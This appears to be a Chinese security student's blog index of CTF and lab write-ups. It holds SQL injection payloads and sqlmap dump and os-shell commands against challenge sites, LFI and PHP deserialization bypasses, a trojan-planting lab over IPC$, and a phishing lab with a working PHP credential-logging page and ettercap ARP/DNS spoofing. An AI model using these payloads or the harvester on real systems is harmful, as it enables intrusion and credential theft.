magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误 SELECT * FROM users WHERE name=\\&#39;&#39;.$username.&#39;\\&#39; AND pass=\\&#39;&#39;.$password.&#39;\\&#39;; 反斜杠遇到单引号后，起到转义作用，实际sql语句如下 SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;; 这里注入与之前的注入不同，这里针对的是password SELECT * FROM users WHERE name=&#39; \\&#39; AND pass=&#39; or 1=1 --+&#39;; \\&#39; AND pass= 作为name 参数的值 所以构造?name=&amp;password=or 1=1 –+ SQL注入2123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; //post 方式接收两个参数 mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]);//对pass md5加密 $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#x27;$user&#x27;&quot;));//获取pw字段的值 if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; // 比较pass和pw echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; poyload: user= &#39; union select md(1) &amp;pass=1 select pw from ctf where user=&#39;&#39; union select md(1) 此查询语句获得我pw值为md(1),所以if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))语句成立，显示flag (还没完全理解) 综合题 首页中给出很长的jsfuck，可以使用浏览器的console解码 ,给出一个页面 访问 1bc29b36f623ba82aaf6724fd3b16718.php 提示在header里 查看header history of bash 如果使用的是bash，在家目录中会生成.bash_history文件用来保存历史命令。访问.bash_history文件，可以得到这样的历史命令 url: http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 获得zip -r flagbak.zip ./* 访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip file_get_contents查看源码获取被注释的内容 1234$file = $_GET[&#x27;file&#x27;];if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123; echo $nctf;&#125; 分析可得 通过get方式传递flle=文件名并且这个文件的内容==‘meizijiu’如果等于就打印flag php伪协议php://input来构造原始数据的只读流 变量覆盖参考 https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1 源码 123456&lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == &quot;meizijiu233&quot;)&#123; echo $flag;&#125;--&gt; 12GET:?name=meizijiu233","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"弱类型","slug":"弱类型","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"}]},{"title":"nctf","date":"2020-08-29T14:38:08.000Z","path":"2020/08/29/nctf/","text":"nctf-1 签到题查看源码即可看到flag md5 collision一道简单的md5漏洞题目 md5函数漏洞 源码 12345678910$md51 = md5(&#x27;QNKCDZO&#x27;);$a = @$_GET[&#x27;a&#x27;];$md52 = @md5($a);if(isset($a))&#123;if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123; echo &quot;nctf&#123;*****************&#125;&quot;;&#125; else &#123; echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125; 即使用get方式传递一个参数a,使得a的值不等于QNKCDZO但是二者的md5值相同 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有 1234567891011QNKCDZO240610708s878926199as155964671as214587387as214587387a sha1(str)sha1(&#x27;aaroZmOk&#x27;) sha1(&#x27;aaK1STfY&#x27;)sha1(&#x27;aaO8zKZF&#x27;)sha1(&#x27;aa3OFF9m&#x27;) 签到2提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母 F12审查元素，修改输入框的maxlength值，大于11即可 再次输入口令即可。 考点为前端代码修改 这题不是WEB这道题还真不是web 进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex 在最后发现flag 层层递进 题目为层层递进，通过F12中Sources功能，查看网站的包含情况，发现到可疑地址：SO.html，查看发现相似可以地址，最后在404.html源码中得到flag（竖排插入在标签中）： 单身二十年tip:在这里找key 点击发现url改变，跳转到了另一个页面 bp抓包试试，go一下，相应包中出现flag phpencode一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错 将最后的eval改为echo,提交运行即可 LFI 黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。 根据PHP伪协议尝试构造如下Payload：?file=php://filter/read=convert.base64-encode/resource=index.php，将index.php的源码经过Base64编码输出 PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4= base64解码 1234567891011121314&lt;html&gt; &lt;title&gt;asdf&lt;&#x2F;title&gt;&lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;&#x2F;html&gt; 单身一百年也没用与单身二十年一样，抓包即可 cookie Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息 。 TIP: 0==not bp抓包，将cookie:login = 0改cookie:login=1 go MYSQL进入题目，提示robots协议 robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。 robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。 查看robots.txt url:http://chinalover.sinaapp.com/web11/robots.txt 12TIP:sql.php//这里提示sql.php的源码如下 1234567891011121314&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#x27;$id&#x27;&quot;)); if ($_GET[id]==1024) &#123; echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形） 之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。 http://chinalover.sinaapp.com/web11/sql.php?id=10 尝试id=10，无结果 id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句 想到了intval()函数的作用，尝试id=1024.1 GBK Injection宽字节注入，之前写过。 /x0012345678if (isset ($_GET[&#x27;nctf&#x27;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;nctf&#x27;]) === FALSE) echo &#x27;必须输入数字才行&#x27;; else if (strpos ($_GET[&#x27;nctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE) die(&#x27;Flag: &#x27;.$flag); else echo &#x27;骚年，继续努力吧啊~&#x27;; &#125; 试了试?nctf[]=1,出现了报错但是答案真就出来了 正儿八经的做法是?nctf=1%00%23biubiubiu，简单的代码审计 bypass again12345678910&lt;?phpif (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;]))&#123;if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;])if (md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))die(&#x27;Flag: &#x27;.$flag);elseprint &#x27;Wrong.&#x27;;&#125; ?&gt; 代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞 在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。 payload: http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3 伪装者bp抓包，添加X-Forwarded-For=127.0.0.1,发包即可 X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"代码审计","slug":"代码审计","permalink":"https://sunzhengyu99.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"bypass","slug":"bypass","permalink":"https://sunzhengyu99.github.io/tags/bypass/"}]},{"title":"SSTI","date":"2020-08-16T14:08:06.000Z","path":"2020/08/16/SSTI/","text":"https://www.cnblogs.com/wangtanzhi/p/12238779.html","tags":[{"name":"STTI","slug":"STTI","permalink":"https://sunzhengyu99.github.io/tags/STTI/"}]},{"title":"Bugku","date":"2020-08-08T14:40:51.000Z","path":"2020/08/08/Bugku/","text":"Bugku刷题 成绩单1231&#x27; and 1=1 # 1&#x27; and 1=2 # 不显示内容，可以判断存在注入点 手工注入1.1&#39; order by 4#可正常显示可以判断存在四个字段2.爆数据库` -1&apos; union select 1,database(),3,4 #` database:skctf_flag3.爆出表名-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc 4.字段名-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag 得到flag (select skctf_flag from skctf_flag.fl4g) sqlmap 因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中 1.获取数据库python2 sqlmap.py -r a.txt --dbs 2.获取表名python2 sqlmap.py -r a.txt -D skctf_flag --tables 3.获取列名python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns 4.获取flagpython2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump 备份是个好习惯 扫描发现了index.php，通过 index.php.bak下载网页源码 123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&#x27;REQUEST_URI&#x27;], &#x27;?&#x27;);$str = substr($str,1);$str = str_replace(&#x27;key&#x27;,&#x27;&#x27;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;echo $flag.&quot;取得flag&quot;;&#125;?&gt; 对上传的值进行了过滤key, kekeyy可以绕过 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等 payload: ?kekey1[]=da&amp;kekey2[]=dada 2.利用==比较漏洞 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 下列的字符串的MD5值都是0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 多次爆数据库名 http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+ database:web1002-1 爆表名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+flag1,hint 爆字段名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos; --+flag1,address获取内容 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+usOwycTju+FTUUzXosjr 提交发现不对 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+获取address中的内容 ./Once_More.php下一关地址得到另外一个地址 http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23给出提示XPATH syntax error: ‘class,flag2‘ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23Unknown column ‘flag2’ in ‘where clause’ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23XPATH syntax error: ‘flag{Bugku-sql_6s-2i-4t-bug}‘ ！！！注意把flag改为小写字母 宽字节注入靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 一、手工注入第一步 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27加单引号报错 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,table_name from information_schema.tables where table_schema=database()%23查看所有的表 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23查看表中的列 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23 ctf,ctf2,ctf3,ctf4,gbksqli,news0x637466 为十六进制ctf 获取字段内容 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(pw) from ctf %23flag:nctf{h4cked_By_w00dPeck3r} 二、sqlmap注入检测是否有注入点 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27没有成功使用十六进制 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex获取数据库名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --dbs //选择十六进制 获取数据库名 单引号使用url编码获取表名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --D sae-chinalover --tables获取flag sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex -D sae-chinalover -T ctf --dump","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"木马","date":"2020-07-18T12:34:10.000Z","path":"2020/07/18/木马/","text":"初识木马 实验目的使用灰鸽子软件以及端口爆破软件控制目的主机 准备一台xp，一台2003其中xp地址为10.1.1.3/24 2003为10.1.1.1/24使两个主机能够通信xp作为攻击方，2003为受害者 1.制作木马使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用） 2.扫描主机，并对账号密码进行爆破ip起始地址为10.1.1.1-10.1.1.255密码配置文件其实只要扫描10.1.1.1即可（因为是实验） 获取账号密码username：administratorpassword: “” 3.与目标主机建立IPC$net use \\\\10.1.1.1\\ipc$ &quot;&quot; \\user:administrator 4.植入木马到目标主机copy C:\\Documents and Settings\\shimisi\\桌面\\qq.exe \\\\10.1.1.1\\ipc$ 5.设置目标主机运行木马net time \\\\10.1.1.1根据目标主机时间设置事物的开始时间at \\\\10.1.1.1 17:17 c:\\qq.exe在上面的时间之后三分钟左右设置一个事物即在17：17时运行木马文件 6.成功控制目标主机观察目标主机已自动上线，已可以进行监控或传输数据等操作 获取屏幕内容 控制命令行","tags":[]},{"title":"jdtest","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/jdtest/","text":"爬取京东商品图片的小测试 访问的页面图片链接的位置 123456789101112131415161718192021222324252627282930313233# -*- coding = utf - 8 -*-#@Time : 2020/7/16 14:54#@Author : sunzy#@File : jd.pyimport reimport requestsimport timeimport osdir = &quot;jdtp&quot;if not os.path.exists(dir): os.mkdir(dir)baseurl = &quot;https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu&quot;head = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot; &#125;response = requests.get(url=baseurl, headers = head)#print(response.text)html = response.textfindlinks = &#x27;&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;\\d&quot; src=&quot;(.*?)&quot;.*?&gt;&#x27;#&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;1&quot; src=&quot;//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg&quot; data-lazy-img=&quot;done&quot; source-data-lazy-img=&quot;&quot;&gt;urls = re.findall(findlinks, html)for url in urls: time.sleep(1) file_name = url.split(&#x27;/&#x27;)[-1] res = requests.get(&quot;http:&quot;+url,headers = head) with open(dir+&#x27;/&#x27;+file_name, &quot;wb&quot;) as f: f.write(res.content)","tags":[{"name":"python","slug":"python","permalink":"https://sunzhengyu99.github.io/tags/python/"}]},{"title":"sqlmap","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/sql注入/","text":"sqlmap使用 第一步: -u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测第二步: -u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取第三步: -u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举第四步: -u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举第五步: -u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump //探测user表name和password字段如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字典进行爆破。 第六步: -u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言sql注入order by * group by * 利用内置函数暴数据库信息 version() 查看数据库版本 database() 查看当前数据库名 user() 查看当前用户 查看表： Select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() 可十六进制查看字段： select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"爬图","date":"2020-07-18T09:40:51.000Z","path":"2020/07/18/爬图/","text":"用爬虫爬取小姐姐的图片 用的库 1234re #正则表达式requests #url请求time #时间os #用于创建文件夹，保存图片 ##准备工作1.首先访问该链接https://www.vmgirls.com/2.随便点击一个进入查看详情https://www.vmgirls.com/13344.html3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式该正则表达式为findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39; 完整程序12345678910111213141516171819202122232425262728293031# -*- coding = utf - 8 -*-#@Time : 2020/7/16 13:36#@Author : sunzy#@File : tupian.pyimport reimport requestsimport timeimport osdir = &quot;plmm&quot; #文件夹名字if not os.path.exists(dir): #首先判断是否存在当前文件夹如果没有则创建一个 os.mkdir(dir)# 模仿浏览器的首部信息，绕过一些网站的反爬取措施head = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot; &#125;url = &quot;https://www.vmgirls.com/13344.html&quot;response = requests.get(url, headers = head) # 访问目标网页，获取网页内容html = response.textfindlinks = &#x27;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#x27;urls = re.findall(findlinks, html) #爬取到的图片链接保存在urls中， 是一个列表for url in urls: time.sleep(1) #防止访问速度过快使服务器崩溃 file_name = url.split(&#x27;/&#x27;)[-1] #保存图片的名字 res = requests.get(url, headers = head) #依此访问图片链接 with open(dir+&#x27;/&#x27;+file_name, &quot;wb&quot;) as f: #以二进制形式保存图片 f.write(res.content)","tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"diaoyu","date":"2020-07-18T09:37:15.000Z","path":"2020/07/18/diaoyu/","text":"DNS欺骗、ARP攻击及钓鱼网站制作 1.实验目的获取登录jd网页的用户名和密码2.实验主机一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者3.实验材料京东登录网页及其所有图片（浏览器访问https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F 之后保存网页即可）修改index.html中的内容error.php中的内容如下关键代码（用于保存用户名和密码以及迷惑用户） 12345678910111213141516171819&lt;?php$nam = stripslashes($_POST[&#x27;name&#x27;]); //name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要$pas = stripslashes($_POST[&#x27;pass&#x27;]);//pass也一样$content = &quot;您已捕获京东账号及密码1个：&quot; . &quot; 用户名 &quot; . $nam . &quot; 密码 &quot; . $pas; //保存捕获的用户名和密码$filed = @fopen(&quot;1.txt&quot;, &quot;a+&quot;); //打开1.txt@fwrite($filed, &quot;$content\\n&quot;); //将用户名和密码写入1.txt?&gt;&lt;html&gt;&lt;head&gt;&lt;script type=&quot;text/javascript&quot;&gt; function goBack() &#123; window.history.back() //后退+刷新 &#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=&quot;goBack()&quot;&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;&lt;/body&gt;&lt;/html&gt; 4.实验拓扑图 实验步骤一.部署京东的服务器1.安装DNS和web服务器（具体步骤略）2.配置DNS服务器a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）b.在jd域中新建一台主机 www.jd.com ip:10.1.1.1 2.IISa.将默认网站停止b.新建网站jd.com,文件路径为保存的jd网页c.打开web服务中的asp（因为此网站不是静态网站）（使用2003客户机访问www.jd.com看看网站发布是否成功） 二.部署kali1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。2.开启apache服务，并检查80端口是否已开启systemctl start apache2netstat -antpl3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，添加一条 PTR 记录，使用户访问www.jd.com，指向为10.1.1.2 选中一行后，按两次d可删除内容想要编辑时，先按i(insert)编辑结束后 :wq 保存4.打开ettercap软件5.选择sniff–unified sniffing，并选择监听eth06.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机7.添加欺骗记录选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 28.在Mitm选择ARP欺骗在弹出的窗口中，勾选第一个点击确定9.选择plugins – Manage the plugins，准备进行DNS欺骗在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗 三.用户访问登录页面1.在客户机中在中，再次登录www.jd.com输入用户名密码然后点击登录 2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)","tags":[{"name":"DNS","slug":"DNS","permalink":"https://sunzhengyu99.github.io/tags/DNS/"}]},{"title":"guestbook","date":"2020-04-18T09:42:34.000Z","path":"2020/04/18/Guestbook/","text":"guestbook 题目提示：This guestbook sucks. sqlmap is your friend. 是sql注入点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息 在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点union 注入!查看列 12https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,3,4%20#//id=-1 是让前面的内容不显示 3被回显 1.查看数据库名 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,database(),4%20# 数据库的名字g8 2.查看表名 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4# 发现有一个表 flag 3.测试表的字段 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name=&#x27;flag&#x27; limit 1,1),4# 仍然显示flag 4.读取flag 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4# 得到flag!","tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://sunzhengyu99.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"反序列化","date":"2020-03-28T09:42:34.000Z","path":"2020/03/28/php反序列化/","text":"反序列化 PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 而wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。 serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。 unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。 举例说明 &lt;?php class Student&#123; public $full_name = &apos;zhangsan&apos;; public $score = 150; public $grades = array(); function __wakeup() &#123; echo &quot;__wakeup is invoked&quot;; &#125; &#125; $s = new Student(); var_dump(serialize($s)); ?&gt; O:7:&quot;Student&quot;:3:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;各个符号的含义变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容} 其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。 当我们将上述的序列化的字符串中的对象属性个数修改为5，变为O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}} 最后执行运行的代码如下: 1234567891011121314151617&lt;?phpclass Student&#123;public $full_name = &#x27;zhangsan&#x27;;public $score = 150;public $grades = array();function __wakeup() &#123;echo &quot;__wakeup is invoked&quot;;&#125;function __destruct() &#123;var_dump($this);&#125;&#125;$s = new Student();$stu = unserialize(&#x27;O:7:&quot;Student&quot;:5:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;&#x27;);?&gt; 举例说明题目 123456class xctf&#123;public $flag = &#x27;111&#x27;;public function __wakeup()&#123;exit(&#x27;bad requests&#x27;);&#125;?code= 12345678910&lt;?phpclass xctf&#123; //定义一个名为xctf的类public $flag = &#x27;111&#x27;;//定义一个公有的类属性$flag，值为111public function __wakeup()&#123; //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本exit(&#x27;bad requests&#x27;);&#125;&#125;$test = new xctf(); //使用new运算符来实例化该类（xctf）的对象为testecho(serialize($test)); //输出被序列化的对象（test）?&gt; 输出结果 O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad 